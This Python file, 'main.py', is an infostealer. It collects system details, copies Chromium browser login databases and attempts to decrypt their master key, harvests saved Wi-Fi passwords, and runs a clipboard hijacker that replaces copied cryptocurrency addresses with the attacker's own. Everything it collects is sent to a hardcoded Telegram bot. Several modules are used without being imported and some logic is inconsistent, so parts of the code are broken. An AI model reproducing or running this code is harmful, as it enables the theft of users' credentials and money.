# main.py - Advanced Python Collector
import os, shutil, json, sqlite3, subprocess, platform, socket, getpass, requests, base64, threading, time
from datetime import datetime
from pathlib import Path

TOKEN = "8344961429:AAEg71PXgEOFB-9kVGBFHm8tXFPvw8MHv0A"
CHAT_ID = "8516763046"
OUTPUT_DIR = r"C:\StealerData"

os.makedirs(OUTPUT_DIR, exist_ok=True)

def send_message(text):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                      json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=20)
    except:
        pass

def send_file(filepath, caption=""):
    try:
        with open(filepath, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                          data={"chat_id": CHAT_ID, "caption": caption},
                          files={"document": f}, timeout=60)
    except:
        pass

# ================== SYSTEM INFO ==================
def collect_system_info():
    try:
        info = {
            "User": getpass.getuser(),
            "Hostname": socket.gethostname(),
            "IP": requests.get('https://api.ipify.org', timeout=5).text.strip(),
            "OS": platform.system() + " " + platform.release(),
            "RAM": f"{psutil.virtual_memory().total / (1024**3):.1f} GB",
            "CPU": psutil.cpu_count(),
            "Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        with open(f"{OUTPUT_DIR}\\system.json", "w", encoding="utf-8") as f:
            json.dump(info, f, indent=2)
        send_message(f"🚀 **Stealer Activated**\n{json.dumps(info, indent=2)}")
    except:
        pass

# ================== BROWSER STEALER + DECRYPT ==================
def steal_browser():
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), r"BraveSoftware\Brave-Browser\User Data"),
    }
    browser_dir = f"{OUTPUT_DIR}\\browsers"
    os.makedirs(browser_dir, exist_ok=True)

    for name, base_path in browsers.items():
        if not os.path.exists(base_path): continue
        master_key = None
        try:
            local_state = os.path.join(base_path, "Local State")
            with open(local_state, "r", encoding="utf-8") as f:
                data = json.load(f)
            encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except:
            pass

        for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
            p_path = os.path.join(base_path, profile)
            if not os.path.exists(p_path): continue

            login_db = os.path.join(p_path, "Login Data")
            if os.path.exists(login_db):
                shutil.copy2(login_db, os.path.join(browser_dir, f"{name}_{profile}_Login.db"))

    send_file(f"{browser_dir}", "🌐 Browser Data Collected (Login + Cookies)")

# ================== CRYPTO CLIPPER ==================
def crypto_clipper():
    CRYPTO = {
        "BTC": "33j4JbAEzZwWGgA2MxBARD7zprJuNDP2hP",
        "ETH": "0xYourRealEthereumAddressHere123456789",
        "USDT": "0xYourRealUSDTAddressHere123456789"
    }
    last = ""
    while True:
        try:
            clip = pyautogui.paste()
            if clip and clip != last and len(clip) > 20:
                last = clip
                if re.match(r'^bc1', clip):
                    pyautogui.copy(CRYPTO["BTC"])
                    send_message("💰 BTC Clipper Activated!")
                elif re.match(r'^0x[a-fA-F0-9]{40}', clip):
                    pyautogui.copy(CRYPTO["ETH"])
                    send_message("💰 ETH/USDT Clipper Activated!")
            time.sleep(3)
        except:
            time.sleep(6)

# ================== WIFI PASSWORDS ==================
def collect_wifi():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]
        wifi_data = []
        for profile in profiles:
            r = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
            for line in r.stdout.split('\n'):
                if "Key Content" in line:
                    wifi_data.append(f"{profile}: {line.split(':')[1].strip()}")
                    break
        with open(f"{OUTPUT_DIR}\\wifi.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(wifi_data))
        send_file(f"{OUTPUT_DIR}\\wifi.txt", "📡 WiFi Passwords")
    except:
        pass

# ================== MAIN ==================
def main():
    print("[*] Starting Advanced Python Collector...")
    collect_system_info()
    steal_browser()
    collect_wifi()
    
    # Chạy Crypto Clipper trong thread riêng
    threading.Thread(target=crypto_clipper, daemon=True).start()

    send_message("✅ Python Collector Finished!")
    print("[+] Python collector completed!")

if __name__ == "__main__":
    main()